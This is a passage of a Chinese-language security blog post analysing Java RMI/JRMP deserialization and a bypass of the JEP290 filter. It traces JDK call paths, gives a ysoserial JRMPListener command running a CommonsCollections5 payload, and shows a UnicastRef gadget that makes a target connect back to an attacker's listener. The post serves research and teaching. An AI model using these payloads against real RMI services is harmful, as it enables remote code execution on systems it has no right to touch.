gcAck</span></span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里反序列化了两个前置的参数，这个函数之后就是payload处的写入，全局搜索该函数的引用处（参数要false的）：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg178eusk1j30w10b6t9q.jpg" alt="DCGClient-1.png"></p>
<p>前两处在<code>sun.rmi.server.UnicastServerRef#dispatch</code>和<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>中，但代码一样，写入了报错信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里出来</span></span><br><span class="line">ObjectOutput out = call.getResultStream(<span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">if</span> (e <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">    e = <span class="keyword">new</span> ServerError(</span><br><span class="line">        <span class="string">"Error occurred in server thread"</span>, (Error) e);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException) &#123;</span><br><span class="line">    e = <span class="keyword">new</span> ServerException(</span><br><span class="line">        <span class="string">"RemoteException occurred in server thread"</span>,</span><br><span class="line">        (Exception) e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (suppressStackTraces) &#123;</span><br><span class="line">    clearStackTraces(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第三处序列化：序列化写入报错信息，也就是payload插入处</span></span><br><span class="line">out.writeObject(e);</span><br></pre></td></tr></table></figure>
<p>后一处在<code>sun.rmi.transport.Transport#serviceCall</code>中，清空了调用栈，然后写入了报错信息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutput out = call.getResultStream(<span class="keyword">false</span>);</span><br><span class="line">UnicastServerRef.clearStackTraces(e);</span><br><span class="line"><span class="comment">//第三处序列化：序列化写入报错信息，也就是payload插入处</span></span><br><span class="line">out.writeObject(e);</span><br><span class="line">call.releaseOutputStream();</span><br></pre></td></tr></table></figure>
<p>那么<strong>服务端在三处地方可以写入payload</strong>去发起对于客户端的请求（其实应该还有更多地方，比如我们下断点找过来的路径就不是这三个的任何一个），找到之后我们就会发现，我们没法去利用原生的payload插入处，去插入payload。因为他们都是写入了报错信息，我们没法去控制。</p>
<p>那么就只有自实现拼接出一个JRMP服务端，来发送给JRMP客户端一个序列化数据，这就是<strong>YSOSERIAL-exploit-JRMPListener</strong>做的事情。</p>
<p>但是我们的这里的重点不是研究<strong>JRMPListener</strong>，所以不详细说明了</p>
<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p><strong>我们可以通过github里的JRMPClient和ysoserial来复现一下JRMP服务端打客户端的过程。</strong></p>
<p>起一个JRMP服务端<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc&quot;</code></p>
<p>这个exploit会对任何请求回应一个响应包，其中报错信息被替换成了CC5链的Object payload。</p>
<p>然后客户端运行<code>JRMPClient.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.lookup(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg178plaw1j317617hnav.jpg" alt="JRMP-listener.png"></p>
<p>成功，而且非常有趣，我们测试的JDK是在JEP290（8u121）修复之后！</p>
<p>这说明<strong>JRMP服务端打JRMP客户端的攻击方法不受JEP290的限制！</strong></p>
<p><strong>为什么？</strong></p>
<p>因为之前也说到JEP290默认只为<strong>RMI注册表</strong>（RMI Register层）和<strong>RMI分布式垃圾收集器</strong>（DGC层）提供了相应的内置过滤器，但是最底层的JRMP是没有做过滤器的。所以可以攻击执行payload</p>
<p>那么有没有可能我们把这个可以绕过JEP290的攻击方式与几种之前被白名单拦截的攻击路径结合呢？</p>
<h3 id="与RMI服务端反序列化攻击RMI注册端-Bind结合"><a href="#与RMI服务端反序列化攻击RMI注册端-Bind结合" class="headerlink" title="与RMI服务端反序列化攻击RMI注册端-Bind结合"></a>与RMI服务端反序列化攻击RMI注册端-Bind结合</h3><p>我们的期待中的攻击流程如下（偷一张老外大佬的图）：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179a6qkrj31r50f5whh.jpg" alt="绕过jep290-流程.png"></p>
<p><strong>上面一条线</strong><code>registry,bind(name,object)</code>是我们RMI服务端bind攻击RMI注册端的攻击路线，但是由于JEP290加入了反序列化过滤器，我们的诸多利用链比如CC被白名单限制失效了。具体细节如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">数组最大长度maxarray=<span class="number">1000000</span>;</span><br><span class="line">调用栈最大深度maxdepth=<span class="number">20</span>;</span><br><span class="line">白名单要求如下：</span><br><span class="line">java.lang.String;</span><br><span class="line">java.lang.Number;</span><br><span class="line">java.lang.reflect.Proxy;</span><br><span class="line">java.rmi.Remote;</span><br><span class="line">sun.rmi.server.UnicastRef;</span><br><span class="line">sun.rmi.server.RMIClientSocketFactory;</span><br><span class="line">sun.rmi.server.RMIServerSocketFactory;</span><br><span class="line">java.rmi.activation.ActivationID;</span><br><span class="line">java.rmi.server.UID</span><br></pre></td></tr></table></figure>
<p>而<strong>下面两条线</strong>对应着我们刚才分析的<strong>JRMP服务端打JRMP客户端</strong>的过程：</p>
<ol>
<li>要RMI注册端作为JRMP客户端去主动连接我们的JRMP服务端（白名单过滤器只对反序列化过程有效，对序列化过程无效）</li>
<li>我们恶意的JRMP服务端在原本是报错信息的位置写入利用链，序列化成数据包返回到JRMP客户端（RMI注册端）。</li>
<li>由于JRMP客户端的反序列化过程不存在JEP290的过滤器，所以我们的payload可以成功被执行，从而完成RCE。</li>
</ol>
<p>那么显而易见这个攻击组合中<strong>唯一缺失的板块</strong>就是：让原本目标是直接命令执行的第一条bind攻击，转换目标成<strong>让RMI注册端去作为JRMP客户端向我们指定的JRMP服务端去发起请求</strong>，从而完成一整个攻击链的衔接，这需要我们去寻<strong>找一个所有对象都在白名单中的Gadget</strong>去完成这一任务。</p>
<blockquote>
<p> 细想这个过程，会发现这个过程跟fastjson的JNDI注入攻击模式很相似，用一个payload去诱导目标服务器发起一个外部连接，连接到我们控制的恶意服务，恶意服务再去返回payload从而在服务器上完成命令执行。</p>
<p>它也跟我们所说的内网渗透中的免杀平台很像，我们只需要免杀平台免杀（对应JRMP攻击链逃过JEP290），然后外部命令都在免杀平台（通过JRMP攻击链）上执行。</p>
</blockquote>
<p>理顺一下我们的目标：</p>
<ol>
<li>我们要找一个Gadget，它在服务端的反序列化的过程中，会对我们指定的JRMP服务器发起JRMP连接。</li>
<li>在找到这个Gadget之后，我们需要进一步将它封装进入<code>register.bind(String,Remote)</code>中。（为了满足客户端的格式需求）</li>
</ol>
<p>那么我们先来第一步：找Gadget。</p>
<p>假如让我们自己真的从零开始找这个Gadget，我们应该先找出所有会向服务器发起JRMP请求的最底层方法，然后向上看何处调用了这个方法来进行一层层逆推，直到找到一个对象的反序列化入口（比如readobject）。那么再从反序列化入口反过来拎起来就是一个Gadget。</p>
<p>但是在看别人的Gadget的时候就从反序列化口子开始看便于理解。</p>
<h4 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h4><p>Ysoserial中的payloads-JRMPClient就是一个可以完成JRMP服务器发起JRMP连接的调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * UnicastRef.newCall(RemoteObject, Operation[], int, long)（！！JRMP请求的发送处！！）</span></span><br><span class="line"><span class="comment"> * DGCImpl_Stub.dirty(ObjID[], long, Lease)（这里是我们上面JRMP服务端打客户端，客户端的反序列化触发处）</span></span><br><span class="line"><span class="comment"> * DGCClient$EndpointEntry.makeDirtyCall(Set&lt;RefEntry&gt;, long)</span></span><br><span class="line"><span class="comment"> * DGCClient$EndpointEntry.registerRefs(List&lt;LiveRef&gt;)</span></span><br><span class="line"><span class="comment"> * DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;)</span></span><br><span class="line"><span class="comment"> ------这里实际上不是一个连贯的调用栈,之后说明-----</span></span><br><span class="line"><span class="comment"> * LiveRef.read(ObjectInput, boolean)</span></span><br><span class="line"><span class="comment"> * UnicastRef.readExternal(ObjectInput)（！！反序列化的入口！！）</span></span><br></pre></td></tr></table></figure>
<p>可能有的同学对于<code>UnicastRef.readExternal()</code>作为反序列化的入口有点疑惑，其实我们在 <strong>JAVA反序列化-基础</strong> 中提到过这个。反序列化的入口其实不止readobject()，还有readExternal()，只不过后者稍微少见点。</p>
<p>在实际触发的时候，这个触发过程其实不是我们常见的readobject进来一路向下就直接完成触发的调用栈，它其实分为两部分</p>
<ol>
<li>readObject()：组装填入ref</li>
<li>releaseInputStream()：统一处理ref</li>
</ol>
<p>看bind的反序列化过程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var9 = var2.getInputStream();<span class="comment">//var2是我们的输入流</span></span><br><span class="line">    var7 = (String)var9.readObject();<span class="comment">//略过</span></span><br><span class="line">    <span class="comment">//payload在这，在readobject中递归调用属性，进入UnicastRef#readExternal</span></span><br><span class="line">    <span class="comment">//在其中完成了ref的填装</span></span><br><span class="line">    var80 = (Remote)var9.readObject();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException var77) &#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var77);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">//在这里处理ref的时候才真正完成了触发</span></span><br><span class="line">	var2.releaseInputStream();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说实际上<strong>JRMP服务器发起JRMP连接</strong>的时候是在<code>var2.releaseInputStream();</code>的语句中。</p>
<p>我们从<code>var9.readObject();</code>反序列化入口开始跟一遍：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179gvpt6j31d10yj0yx.jpg" alt="纠错第一步.png"></p>
<p><code>sun.rmi.server.UnicastRef#readExternal</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ref = LiveRef.read(in, <span class="keyword">false</span>);<span class="comment">//---进入此处----</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sun.rmi.transport.LiveRef#read</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title">read</span><span class="params">(ObjectInput in, <span class="keyword">boolean</span> useNewFormat)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       Endpoint ep;</span><br><span class="line">       ObjID id;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 从输入流中读取endpoint, id和result flag</span></span><br><span class="line">       <span class="comment">// 一个固定的格式版本判断，根据JDK版本有关</span></span><br><span class="line">       <span class="keyword">if</span> (useNewFormat) &#123;</span><br><span class="line">           ep = TCPEndpoint.read(in);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       	<span class="comment">//读取</span></span><br><span class="line">           ep = TCPEndpoint.readHostPortFormat(in);</span><br><span class="line">       &#125;</span><br><span class="line">       id = ObjID.read(in);</span><br><span class="line">       <span class="keyword">boolean</span> isResultStream = in.readBoolean();</span><br><span class="line">	<span class="comment">//恢复一个LiveRef对象(可以理解为一个连接对象)</span></span><br><span class="line">	<span class="comment">//此处可以由我们的序列化对象进行指定。</span></span><br><span class="line">       LiveRef ref = <span class="keyword">new</span> LiveRef(id, ep, <span class="keyword">false</span>);</span><br><span class="line">	<span class="comment">//判断输入流in是不是已经是一个对象流了，这里都会为true</span></span><br><span class="line">       <span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">           ConnectionInputStream stream = (ConnectionInputStream)in;</span><br><span class="line">           <span class="comment">// 保存ref以在所有参数/返回都被解析后再发送"dirty"调用。</span></span><br><span class="line">           stream.saveRef(ref);</span><br><span class="line">           <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">               stream.setAckNeeded();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       	<span class="comment">//-----这里会产生一个误区，实际上我们进入的不是这个registerRefs----</span></span><br><span class="line">           DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> LiveRef[] &#123; ref &#125;));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> ref;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>我们会进入<code>stream.saveRef(ref);</code>中，将ref填入流中的<code>incomingRefTable</code>字段，再之后统一解析。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179nw4ikj31gs0q7dja.jpg" alt="纠错01.png"></p>
<p>然后readobject就执行完了，进入第二步 <strong>releaseInputStream 触发</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg179tjfqgj31nf0twn3i.jpg" alt="纠错第二步.png"></p>
<p><code>sun.rmi.transport.StreamRemoteCall#releaseInputStream</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">releaseInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.in != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//...省略</span></span><br><span class="line">            <span class="comment">//进入此处，统一处理去DGC注册之前readobject解析出来的ref</span></span><br><span class="line">            <span class="keyword">this</span>.in.registerRefs();</span><br><span class="line">            <span class="keyword">this</span>.in.done(<span class="keyword">this</span>.conn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.conn.releaseInputStream();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.in = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sun.rmi.transport.ConnectionInputStream#registerRefs</code>:从之前readobject语句解析出来的<code>incomingRefTable</code>中读取ref。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.incomingRefTable.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">//遍历incomingRefTable</span></span><br><span class="line">        Iterator var1 = <span class="keyword">this</span>.incomingRefTable.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span>(var1.hasNext()) &#123;</span><br><span class="line">            Entry var2 = (Entry)var1.next();</span><br><span class="line">            <span class="comment">//开始一个个去DGC注册</span></span><br><span class="line">            DGCClient.registerRefs((Endpoint)var2.getKey(), (List)var2.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就回到了yso里面的调用栈的下半部分：<code>sun.rmi.transport.DGCClient#registerRefs</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">registerRefs</span><span class="params">(Endpoint ep, List&lt;LiveRef&gt; refs)</span> </span>&#123;</span><br><span class="line">    EndpointEntry epEntry;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//从给定的ep中查找引用对象入口</span></span><br><span class="line">        <span class="comment">//这里就是我们调用栈下面一直跑的部分。</span></span><br><span class="line">        epEntry = EndpointEntry.lookup(ep);</span><br><span class="line">        <span class="comment">//去该入口注册引用对象，如果不成功循环注册，直到成功。</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (!epEntry.registerRefs(refs));<span class="comment">//----进入此处---</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sun.rmi.transport.DGCClient.EndpointEntry#registerRefs</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">registerRefs</span><span class="params">(List&lt;LiveRef&gt; refs)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">assert</span> !Thread.holdsLock(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">            Set&lt;RefEntry&gt; refsToDirty = <span class="keyword">null</span>;     <span class="comment">// entries for refs needing dirty</span></span><br><span class="line">            <span class="keyword">long</span> sequenceNum;           <span class="comment">// sequence number for dirty call</span></span><br><span class="line">			<span class="comment">//阻塞执行，去遍历查询LiveRef实例</span></span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">                <span class="comment">//省略此处代码，就是做遍历查询的事情</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//为所有结果参与DGC垃圾回收机制注册</span></span><br><span class="line">    	    <span class="comment">//------进入此处------</span></span><br><span class="line">            makeDirtyCall(refsToDirty, sequenceNum);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><code>sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall</code>:(这里会发出DGC客户端的dirty请求)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">makeDirtyCall</span><span class="params">(Set&lt;RefEntry&gt; refEntries, <span class="keyword">long</span> sequenceNum)</span> </span>&#123;</span><br><span class="line">           <span class="keyword">assert</span> !Thread.holdsLock(<span class="keyword">this</span>);</span><br><span class="line">		<span class="comment">//根据refEntries得到注册用的ids</span></span><br><span class="line">           ObjID[] ids;</span><br><span class="line">           <span class="keyword">if</span> (refEntries != <span class="keyword">null</span>) &#123;</span><br><span class="line">               ids = createObjIDArray(refEntries);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               ids = emptyObjIDArray;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">//进入此处，进行dirty请求</span></span><br><span class="line">               Lease lease =</span><br><span class="line">                   dgc.dirty(ids, sequenceNum, <span class="keyword">new</span> Lease(vmid, leaseValue));</span><br></pre></td></tr></table></figure>
<p>由于这里是一个接口，静态分析的话，我们需要使用ctrl+alt+B，进入<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Lease <span class="title">dirty</span><span class="params">(ObjID[] var1, <span class="keyword">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          RemoteCall var5 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              ObjectOutput var6 = var5.getOutputStream();</span><br><span class="line">              var6.writeObject(var1);</span><br><span class="line">              var6.writeLong(var2);</span><br><span class="line">              var6.writeObject(var4);</span><br><span class="line">          &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var20);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//JRMP服务端打JRMP客户端的反序列化触发点在这里面</span></span><br><span class="line">          <span class="keyword">super</span>.ref.invoke(var5);</span><br></pre></td></tr></table></figure>
<p>这里就很熟悉了，JRMP服务端打JRMP客户端，JRMP客户端的漏洞触发点就在这。</p>
<p>那么也就是说<strong>UnicastRef对象的readExternal方法作为反序列化入口的话</strong>，我们可以通过控制序列化的内容使服务器向我们指定的服务器发起JRMP连接（通过DGC层的dirty方法发起），再通过之前讲到的JRMP客户端报错信息反序列化点完成RCE。</p>
<p>我们把之前的攻击过程调试一下看下，同样在CC链的最后命令执行处下断点：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17a0o9vlj30qw0eedhw.jpg" alt="绕过JEP290-bind调用栈.png"></p>
<p>调用栈,应该是由于服务端线程处理的特性（？）发生了变化，但是最后核心部分是没问题的。（UnicastRef的readExternal处作为入口下断点也是可以看到的，但是之后会跑偏，最后再到这部分）</p>
<blockquote>
<p>本地实验发现一个有趣的地方，这里会不断循环，一直请求我们恶意JRMP-Listener，从而不断完成远程代码执行的情况。原因应该是因为分析代码的时候的while循环导致的（这就是我们反序列化触发栈发生变动的原因。），非常有趣，仿佛一个天然发心跳包的木马一样。</p>
</blockquote>
<p>知道服务端反序列化处的触发流程之后，我们来看payload的构造。</p>
<p>一个基础的可以指定连接目标的UnicastRef对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//让受害者主动去连接的攻击者的JRMPlister的host和port</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> UnicastRef <span class="title">generateUnicastRef</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">    java.rmi.server.ObjID objId = <span class="keyword">new</span> java.rmi.server.ObjID();</span><br><span class="line">    sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class="keyword">new</span> sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class="line">    sun.rmi.transport.LiveRef liveRef = <span class="keyword">new</span> sun.rmi.transport.LiveRef(objId, endpoint, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> sun.rmi.server.UnicastRef(liveRef);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果这个对象在目标服务器反序列化成功了，就可以顺着之前分析的反序列化过程向外发起连接。<strong>但是如何让这个对象反序列化呢？</strong>还需要进一步的封装。</p>
<h4 id="与bind操作进行拼接"><a href="#与bind操作进行拼接" class="headerlink" title="与bind操作进行拼接"></a>与bind操作进行拼接</h4><p>我们的目标是：将UnicastRef对象封装进入<code>register.bind(String,Remote)</code>的Remote参数中，从而在反序列化Remote参数的时候因为反序列化的递归的特性，进行UnicastRef对象的反序列化。那又回归到了前面讨论过的问题，如何将UnicastRef对象封装成Remote类型：</p>
<ol>
<li><p>压根不封装，跟Barmie工具一样自实现通讯协议，直接发送UnicastRef（因为其实只有客户端上层函数需要remote类型的输入，服务端并没有要求是remote类型，都会反序列化）</p>
</li>
<li><p>跟RMIRegisterExploit一样，使用<strong>动态代理</strong>来实现封装</p>
<p>回一下动态代理封装的原理：将我们的payload放在拦截器的类参数中，然后封装拦截器成Remote类型，反序列化的时候就会反序列化拦截器里面的payload的参数，从而形成反序列化。</p>
<p>但是跟之前不同的是：没有白名单的时候我们可以用到AnnotationInvocationHandler装载UnicastRef对象，再把它动态代理变成Remote对象。</p>
<p>但是在JEP290之后有了白名单限制，AnnotationInvocationHandler对象被禁了。</p>
<p>我们需要用到</p>
</li>
<li><p>找一个同时继承实现两者的类或者一个实现Remote，并将UnicastRef类型作为其一个字段的类。这样只需要把我们的UnicastRef对象塞入这个类中，然后直接塞进<code>register.bind(String,Remote)</code>中就可以了。</p>
</li>
</ol>
<h5 id="1-绕过客户端-自实现协议"><a href="#1-绕过客户端-自实现协议" class="headerlink" title="1.绕过客户端-自实现协议"></a>1.绕过客户端-自实现协议</h5><p>第一类实现bind底层协议，太过底层，感觉可以根据Barmie改，但是有点磕不动，放放。</p>
<blockquote>
<p>但是在最后我们还是以两种方式自实现了lookup的协议。</p>
</blockquote>
<h5 id="2-动态代理-自定义"><a href="#2-动态代理-自定义" class="headerlink" title="2.动态代理-自定义"></a>2.动态代理-自定义</h5><p>代码参考github-Bypass290_proxy.java</p>
<p>我们自定义一个PocHandler拦截器：</p>
